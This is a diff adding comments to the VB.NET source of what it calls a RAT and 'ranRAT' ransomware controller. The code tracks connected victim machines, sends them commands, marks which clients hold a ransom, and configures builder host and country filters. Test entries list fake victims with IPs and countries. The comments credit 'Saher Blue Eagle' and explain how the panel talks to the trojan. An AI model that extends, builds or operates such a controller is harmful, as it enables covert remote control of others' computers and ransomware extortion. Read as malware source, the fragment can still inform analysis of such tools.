@@ -99,7 +99,7 @@ Public Class Form1
     End Sub
 
     Private Sub AddFirewall()
-
+        '//the graphics of the firewall 
         ' fireitem.Text = "127.0.0.1" & vbNewLine & "LocaL Listener"
         ' fireitem.ImageIndex = 5
         '  ListView1.Items.Add(fireitem)
@@ -209,6 +209,7 @@ Public Class Form1
     End Sub
     Delegate Sub chatappd(ByVal data1 As String)
     '########### End Drawer
+        'Saher Blue Eagle :D 
     Private Sub RemoveClient(ByVal index As Integer)
         Try
             l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))
@@ -238,10 +239,12 @@ RE:         index -= 1
     '  drawclear(ListView1.Items(index).Position)
     '   ListView1.Items(index).Remove()
     ' End If
+        
     '################## Core 
-
+ 'Saher Blue Eagle :D 
     Private Sub connected(ByVal sock As Integer) Handles s.Connected
         ListBox1.Items.Add(s.IP(sock) & " Connected , client Not logged in")
+            'once a tcp connection done , the RAT sends the fireup string to the trojan 
         s.Send(sock, "info")
 
     End Sub
@@ -253,7 +256,7 @@ RE:         index -= 1
         RemoveClient(sock.ToString)
         On Error Resume Next
         For Each CurrentForm As Form In My.Application.OpenForms
-
+        'Advanced => Close the Open form of the client , as the client disconnects for any reasons 
             If CurrentForm.Name.Equals("!" & sock) Then
                 CurrentForm.Close()
                 MsgBox("Desktop Control Closed !" & vbNewLine & "Client : " & s.IP(sock) & " Disconneted !", MsgBoxStyle.Exclamation)
@@ -287,7 +290,7 @@ RE:         index -= 1
         Next
     End Sub
 
-    Private Function Return_Index(ByVal OS As String) As Integer
+Private Function Return_Index(ByVal OS As String) As Integer'//Return OS index , which images not contain RANsomware label 
         If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
             Return 3
         ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("ta") Or OS.Contains("Vista") Or OS.Contains("VISTA") Or OS.Contains("2007") Or OS.Contains("2008") Then
@@ -300,7 +303,7 @@ RE:         index -= 1
             Return 4
         End If
     End Function
-    Private Function Return_Index_Ranl3(ByVal OS As String) As Integer
+    Private Function Return_Index_Ranl3(ByVal OS As String) As Integer'//Return OS index , which images contains RANsomware label , to identify that this client has a ransom from the ranRAT 
         If OS.Contains("xp") Or OS.Contains("XP") Or OS.Contains("Xp") Then
             Return 2
         ElseIf OS.Contains("7") Or OS.Contains("Seven") Or OS.Contains("even") Or OS.Contains("2008") Then
@@ -326,7 +329,7 @@ RE:         index -= 1
     'un   4
 
 
-    '######### with ran
+'######### with ran (lock image)
     '7    6 
     '8-10 7
     '2002 8
@@ -902,6 +905,8 @@ Label_0002:
     End Sub
     '###############################################################################
     '################################### Commander #################################
+                                                                                            '//The Console  Part :D 
+                                                                                            '// Saher Blue Eagle :D 
     Dim counter As Integer = 0
     Friend Sub getupdatex()
         getUpdate()
@@ -1025,7 +1030,7 @@ Label_0002:
         logger.AppendText(command & vbNewLine)
 
         If command.Contains("set -h ") Then
-
+  '// String Filteration 
             BuilderHost = command.Replace("set -h ", "")
             command = "set -h"
         End If
@@ -1038,6 +1043,7 @@ Label_0002:
             command = "set -n"
         End If
         If command.Contains("li -p ") Then
+                                                                                                      '// String Filteration 
             If command.Contains("False") Then
                 command = "li -p -Res=False"
             End If
@@ -1050,7 +1056,7 @@ Label_0002:
         End If
         If command.Contains("Rcountry -v ") Then
             If command.Contains("Rcountry -v ") And command.Contains(" -R") Then
-
+  '// String Filteration 
                 Dim codel As String = command.Replace("Rcountry -v ", "").Replace(" -R", "")
                 If ListBox2.Items.Contains(codel) = True Then
                     ListBox2.Items.Remove(codel)
@@ -1066,7 +1072,7 @@ Label_0002:
             End If
 
             If command.Contains("Rcountry -v ") And command.Contains(" -A") Then
-
+                                                                                                        '// String Filteration 
                 Dim codel As String = command.Replace("Rcountry -v ", "").Replace(" -A", "")
                 If ListBox2.Items.Contains(codel) = False Then
                     ListBox2.Items.Add(codel)
@@ -1318,7 +1324,7 @@ ReturnLine:
     Friend Sub AddTest()
 
 
-
+                                                                                            '// Testing Random Data (Dummy Data)
         xAdd("Trojan", "fefe", "Windows 7 Ultimate", "Egypt", "156.25.195.42", "Yes")
         ListBox1.Items.Add("156.25.195.42" & " Connected ")
         xAdd("Trojan", "tete", "Windows Server 2008", "Algeria", "45.142.158.92", "No")
